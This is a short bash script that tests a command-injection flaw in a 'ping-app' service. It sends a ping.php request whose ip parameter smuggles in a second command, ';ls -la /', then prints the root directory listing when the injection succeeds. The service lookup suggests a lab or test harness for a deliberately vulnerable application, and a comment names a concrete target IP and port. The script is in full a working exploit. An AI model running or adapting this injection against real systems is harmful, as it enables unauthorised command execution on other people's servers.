#!/usr/bin/env bash

source "$(dirname "$0")/general.sh"

echo "[+] Testing command injection on ${service_map[ping-app]}"

# http://209.38.112.187:8890/ping.php?ip=1.1.1.1%3Bls+-la+%2F

echo "[+] Trying to list the root directory"
output=$(curl -s "http://${service_map[ping-app]}/ping.php?ip=1.1.1.1%3Bls+-la+%2F")
if [ $? -ne 0 ]; then
    echo "[-] Failed to execute command injection attack"
    exit 1
fi

if echo "$output" | grep -q "total"; then
    echo "$output" | sed 's/<[^>]*>/\n/g' | tr -s ' ' | sed '/^[[:space:]]*$/d'
    echo "[+] Command injection attack executed successfully"
else
    echo "[-] Command injection attack failed"
fi


